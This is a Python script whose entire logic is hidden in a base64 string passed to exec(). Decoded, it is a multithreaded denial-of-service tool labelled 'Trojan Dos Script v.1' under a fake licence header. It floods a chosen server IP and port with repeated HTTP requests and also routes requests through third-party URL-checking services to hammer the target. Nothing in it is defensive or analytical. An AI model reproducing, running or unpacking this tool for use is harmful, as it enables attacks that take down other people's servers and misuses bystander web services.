import base64
exec(base64.b64decode('IiIiCkNvcHlyaWdodCBbMjAxOV0gW1RST0pBTiBXSU4zMiBOVF0KCkxpY2Vuc2VkIHVuZGVyIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvbiAyLjAgKHRoZSAiTGljZW5zZSIpOwp5b3UgbWF5IG5vdCB1c2UgdGhpcyBmaWxlIGV4Y2VwdCBpbiBjb21wbGlhbmNlIHdpdGggdGhlIExpY2Vuc2UuCllvdSBtYXkgb2J0YWluIGEgY29weSBvZiB0aGUgTGljZW5zZSBhdAogCiAgaHR0cDovL3d3dy5hcGFjaGUub3JnL2xpY2Vuc2VzL0xJQ0VOU0UtMi4wCgpVbmxlc3MgcmVxdWlyZWQgYnkgYXBwbGljYWJsZSBsYXcgb3IgYWdyZWVkIHRvIGluIHdyaXRpbmcsIHNvZnR3YXJlCmRpc3RyaWJ1dGVkIHVuZGVyIHRoZSBMaWNlbnNlIGlzIGRpc3RyaWJ1dGVkIG9uIGFuICJBUyBJUyIgQkFTSVMsCldJVEhPVVQgV0FSUkFOVElFUyBPUiBDT05ESVRJT05TIE9GIEFOWSBLSU5ELCBlaXRoZXIgZXhwcmVzcyBvciBpbXBsaWVkLgpTZWUgdGhlIExpY2Vuc2UgZm9yIHRoZSBzcGVjaWZpYyBsYW5ndWFnZSBnb3Zlcm5pbmcgcGVybWlzc2lvbnMgYW5kCmxpbWl0YXRpb25zIHVuZGVyIHRoZSBMaWNlbnNlLgoiIiIKCgpmcm9tIHF1ZXVlIGltcG9ydCBRdWV1ZQpmcm9tIG9wdHBhcnNlIGltcG9ydCBPcHRpb25QYXJzZXIKaW1wb3J0IHRpbWUsc3lzLHNvY2tldCx0aHJlYWRpbmcsbG9nZ2luZyx1cmxsaWIucmVxdWVzdCxyYW5kb20KCmRlZiB1c2VyX2FnZW50KCk6CglnbG9iYWwgdWFnZW50Cgl1YWdlbnQ9W10KCXVhZ2VudC5hcHBlbmQoIk1vemlsbGEvNS4wIFdpbkluZXQiKQoJdWFnZW50LmFwcGVuZCgiTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNi4wOyBXaW5kb3dzIE5UIDUuMTsgU1YxKSIpCgl1YWdlbnQuYXBwZW5kKCJPcGVyYS85LjgwIikKCXVhZ2VudC5hcHBlbmQoIlN1cGVyQm90LzMuMCAoV2luMzIpIikKCXVhZ2VudC5hcHBlbmQoIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81OC4wLjMwMjkuMTEwIFNhZmFyaS81MzcuMzYgRWRnZS8xNi4xNjI5OSIpCgl1YWdlbnQuYXBwZW5kKCJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjEuMC4zMTYzLjEwMCBTYWZhcmkvNTM3LjM2IikKCXVhZ2VudC5hcHBlbmQoIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzYzLjAuMzIzOS4xMzIgU2FmYXJpLzUzNy4zNiIpCgl1YWdlbnQuYXBwZW5kKCJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjQuMC4zMjgyLjE4NiBTYWZhcmkvNTM3LjM2IikKCXJldHVybih1YWdlbnQpCgoKZGVmIG15X2JvdHMoKToKCWdsb2JhbCBib3RzCglib3RzPVtdCglib3RzLmFwcGVuZCgiaHR0cDovL3ZhbGlkYXRvci53My5vcmcvY2hlY2s/dXJpPSIpCglib3RzLmFwcGVuZCgiZGZ3ZGllc2VsLm5ldC9jaGVjaz91PSIpCglyZXR1cm4oYm90cykKCgpkZWYgYm90X2hhbW1lcmluZyh1cmwpOgoJdHJ5OgoJCXdoaWxlIFRydWU6CgkJCXJlcSA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4odXJsbGliLnJlcXVlc3QuUmVxdWVzdCh1cmwsaGVhZGVycz17J1VzZXItQWdlbnQnOiByYW5kb20uY2hvaWNlKHVhZ2VudCl9KSkKCQkJcHJpbnQoIlwwMzNbOTRtVFJPSkFOIFdJTjMyIElTIEVYU1RSQVhJTkcuLi5cMDMzWzBtIikKCQkJdGltZS5zbGVlcCguMSkKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKC4xKQoKCmRlZiBkb3duX2l0KGl0ZW0pOgoJdHJ5OgoJCXdoaWxlIFRydWU6CgkJCXBhY2tldCA9IHN0cigiR0VUIC8gSFRUUC8xLjFcbkhvc3Q6ICIraG9zdCsiXG5cbiBVc2VyLUFnZW50OiAiK3JhbmRvbS5jaG9pY2UodWFnZW50KSsiXG4iK2RhdGEpLmVuY29kZSgndXRmLTgnKQoJCQlzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQoJCQlzLmNvbm5lY3QoKGhvc3QsaW50KHBvcnQpKSkKCQkJaWYgcy5zZW5kdG8oIHBhY2tldCwgKGhvc3QsIGludChwb3J0KSkgKToKCQkJCXMuc2h1dGRvd24oMSkKCQkJCXByaW50ICgiXDAzM1swbSBcMDMzWzE7MDs5OW0gdmJzIHNlbnQhIFwwMzNbMTs5Njs5OW08dGhhbmtzIFNpNyBwcm9qZWN0PiAgXDAzM1swbSIpCgkJCWVsc2U6CgkJCQlzLnNodXRkb3duKDEpCgkJCQlwcmludCgiXDAzM1s5MW1zaHV0PC0+ZG93blwwMzNbMG0iKQoJCQl0aW1lLnNsZWVwKC4xKQoJZXhjZXB0IHNvY2tldC5lcnJvciBhcyBlOgoJCXByaW50KCJcMDMzWzkxbSBzZXJ2ZXIgIGRvd25cMDMzWzBtIikKCQkjcHJpbnQoIlwwMzNbOTFtIixlLCJcMDMzWzBtIikKCQl0aW1lLnNsZWVwKC4xKQoKCmRlZiBkb3MoKToKCXdoaWxlIFRydWU6CgkJaXRlbSA9IHEuZ2V0KCkKCQlkb3duX2l0KGl0ZW0pCgkJcS50YXNrX2RvbmUoKQoKCmRlZiBkb3MyKCk6Cgl3aGlsZSBUcnVlOgoJCWl0ZW09dy5nZXQoKQoJCWJvdF9oYW1tZXJpbmcocmFuZG9tLmNob2ljZShib3RzKSsiaHR0cDovLyIraG9zdCkKCQl3LnRhc2tfZG9uZSgpCgoKZGVmIHVzYWdlKCk6CglwcmludCAoJycnIFwwMzNbMzZtCVRyb2phbiBEb3MgU2NyaXB0IHYuMSBodHRwOi8vd3d3LmNhbnlhbGNpbi5jb20vCglJdCBpcyB0aGUgZW5kIHVzZXIncyByZXNwb25zaWJpbGl0eSB0byBvYmV5IGFsbCBhcHBsaWNhYmxlIGxhd3MuCglJdCBpcyBqdXN0IGZvciBzZXJ2ZXIgdGVzdGluZyBzY3JpcHQuIFlvdXIgaXAgaXMgdmlzaWJsZS4gXG4KCXVzYWdlIDogcHl0aG9uMyBkb3MucHkgWy1zXSBbLXBdIFstdF0KCS1oIDogaGVscAoJLXMgOiBzZXJ2ZXIgaXAKCS1wIDogcG9ydCBkZWZhdWx0IDgwCgktdCA6IHR1cmJvIGRlZmF1bHQgMTM1IFwwMzNbMG0nJycpCglzeXMuZXhpdCgpCgoKZGVmIGdldF9wYXJhbWV0ZXJzKCk6CglnbG9iYWwgaG9zdAoJZ2xvYmFsIHBvcnQKCWdsb2JhbCB0aHIKCWdsb2JhbCBpdGVtCglvcHRwID0gT3B0aW9uUGFyc2VyKGFkZF9oZWxwX29wdGlvbj1GYWxzZSxlcGlsb2c9IkhhbW1lcnMiKQoJb3B0cC5hZGRfb3B0aW9uKCItcSIsIi0tcXVpZXQiLCBoZWxwPSJzZXQgbG9nZ2luZyB0byBFUlJPUiIsYWN0aW9uPSJzdG9yZV9jb25zdCIsIGRlc3Q9ImxvZ2xldmVsIixjb25zdD1sb2dnaW5nLkVSUk9SLCBkZWZhdWx0PWxvZ2dpbmcuSU5GTykKCW9wdHAuYWRkX29wdGlvbigiLXMiLCItLXNlcnZlciIsIGRlc3Q9Imhvc3QiLGhlbHA9ImF0dGFjayB0byBzZXJ2ZXIgaXAgLXMgaXAiKQoJb3B0cC5hZGRfb3B0aW9uKCItcCIsIi0tcG9ydCIsdHlwZT0iaW50IixkZXN0PSJwb3J0IixoZWxwPSItcCA4MCBkZWZhdWx0IDgwIikKCW9wdHAuYWRkX29wdGlvbigiLXQiLCItLXR1cmJvIix0eXBlPSJpbnQiLGRlc3Q9InR1cmJvIixoZWxwPSJkZWZhdWx0IDEzNSAtdCAxMzUiKQoJb3B0cC5hZGRfb3B0aW9uKCItaCIsIi0taGVscCIsZGVzdD0iaGVscCIsYWN0aW9uPSdzdG9yZV90cnVlJyxoZWxwPSJoZWxwIHlvdSIpCglvcHRzLCBhcmdzID0gb3B0cC5wYXJzZV9hcmdzKCkKCWxvZ2dpbmcuYmFzaWNDb25maWcobGV2ZWw9b3B0cy5sb2dsZXZlbCxmb3JtYXQ9JyUobGV2ZWxuYW1lKS04cyAlKG1lc3NhZ2UpcycpCglpZiBvcHRzLmhlbHA6CgkJdXNhZ2UoKQoJaWYgb3B0cy5ob3N0IGlzIG5vdCBOb25lOgoJCWhvc3QgPSBvcHRzLmhvc3QKCWVsc2U6CgkJdXNhZ2UoKQoJaWYgb3B0cy5wb3J0IGlzIE5vbmU6CgkJcG9ydCA9IDgwCgllbHNlOgoJCXBvcnQgPSBvcHRzLnBvcnQKCWlmIG9wdHMudHVyYm8gaXMgTm9uZToKCQl0aHIgPSAxMzUKCWVsc2U6CgkJdGhyID0gb3B0cy50dXJibwoKCiMgcmVhZGluZyBoZWFkZXJzCmdsb2JhbCBkYXRhCmhlYWRlcnMgPSBvcGVuKCJoZWFkZXJzLnR4dCIsICJyIikKZGF0YSA9IGhlYWRlcnMucmVhZCgpCmhlYWRlcnMuY2xvc2UoKQojdGFzayBxdWV1ZSBhcmUgcSx3CnEgPSBRdWV1ZSgpCncgPSBRdWV1ZSgpCgoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKCWlmIGxlbihzeXMuYXJndikgPCAyOgoJCXVzYWdlKCkKCWdldF9wYXJhbWV0ZXJzKCkKCXRyeToKCQlrc2sgPSBvcGVuKCdMSVNFTlNJLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50KCJcMDMzWzMxOzk5bUNSSVRJQ0FMIFwwMzNbMDs5OW06IGxpY2Vuc2Ugbm90IGZvdW5kISIpCgkJc3lzLmV4aXQoKQoJCQoJcHJpbnQoIlwwMzNbMG0iLGhvc3QsIiBwb3J0OiAiLHN0cihwb3J0KSwiIHR1cmJvOiAiLHN0cih0aHIpLCJcMDMzWzBtIikKCXByaW50KCJcMDMzWzMzbVBsZWFzZSB3YWl0Li4uXDAzM1swbSIpCgl1c2VyX2FnZW50KCkKCW15X2JvdHMoKQoJdGltZS5zbGVlcCg1KQoJdHJ5OgoJCXMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCgkJcy5jb25uZWN0KChob3N0LGludChwb3J0KSkpCgkJcy5zZXR0aW1lb3V0KDEpCglleGNlcHQgc29ja2V0LmVycm9yIGFzIGU6CgkJcHJpbnQoIlwwMzNbOTFtY2hlY2sgc2VydmVyIGlwIGFuZCBwb3J0XDAzM1swbSIpCgkJdXNhZ2UoKQoJd2hpbGUgVHJ1ZToKCQlmb3IgaSBpbiByYW5nZShpbnQodGhyKSk6CgkJCXQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1kb3MpCgkJCXQuZGFlbW9uID0gVHJ1ZSAgIyBpZiB0aHJlYWQgaXMgZXhpc3QsIGl0IGRpZXMKCQkJdC5zdGFydCgpCgkJCXQyID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZG9zMikKCQkJdDIuZGFlbW9uID0gVHJ1ZSAgIyBpZiB0aHJlYWQgaXMgZXhpc3QsIGl0IGRpZXMKCQkJdDIuc3RhcnQoKQoJCXN0YXJ0ID0gdGltZS50aW1lKCkKCQkjdGFza2luZwoJCWl0ZW0gPSAwCgkJd2hpbGUgVHJ1ZToKCQkJaWYgKGl0ZW0+MTgwMCk6ICMgZm9yIG5vIG1lbW9yeSBjcmFzaAoJCQkJaXRlbT0wCgkJCQl0aW1lLnNsZWVwKC4xKQoJCQlpdGVtID0gaXRlbSArIDEKCQkJcS5wdXQoaXRlbSkKCQkJdy5wdXQoaXRlbSkKCQlxLmpvaW4oKQoJCXcuam9pbigp'))
